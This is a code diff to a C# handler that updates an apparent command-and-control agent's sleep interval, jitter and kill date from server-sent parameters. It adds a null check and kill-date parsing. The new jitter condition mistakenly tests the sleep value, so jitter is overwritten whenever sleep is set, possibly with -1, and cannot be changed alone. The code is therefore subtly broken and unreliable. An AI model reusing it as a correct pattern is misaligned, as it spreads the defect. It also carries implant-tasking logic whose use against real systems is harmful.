@@ -25,26 +25,46 @@ namespace config
         public async Task Execute(ServerJob job)
         {
             ConfigUpdateArgs args = JsonSerializer.Deserialize<ConfigUpdateArgs>(job.task.parameters);
+            if(args is null)
+            {
+                await messageManager.Write("Invalid parameters", job.task.id, true, "error");
+                return;
+            }
+
+
             try
             {
                 StringBuilder sb = new StringBuilder();
 
-                if(args.sleep != -1)
+                if(args.sleep >= 0)
                 {
                     config.sleep = args.sleep;
                     sb.AppendLine($"Updated sleep interval to {config.sleep}");
                 }
 
-                if(args.jitter != -1)
+                if(args.sleep >= 0)
                 {
                     config.jitter = args.jitter;
                     sb.AppendLine($"Updated jitter interval to {config.jitter}");
                 }
 
-                if(args.killdate != DateTime.MinValue)
+                if(!String.IsNullOrEmpty(args.killdate))
                 {
-                    config.killDate = args.killdate;
-                    sb.AppendLine($"Updated killdate to {config.killDate}");
+                    DateTime killDate;
+                    if(DateTime.TryParse(args.killdate, out killDate))
+                    {
+                        if(killDate != DateTime.MinValue)
+                        {
+                            config.killDate = killDate;
+                            sb.AppendLine($"Updated killdate to {config.killDate}");
+
+                        }
+                    }
+                    else
+                    {
+                        sb.AppendLine($"Invalid date format {args.killdate}");
+
+                    }
                 }
 
                 await messageManager.Write(sb.ToString(), job.task.id, true, "");
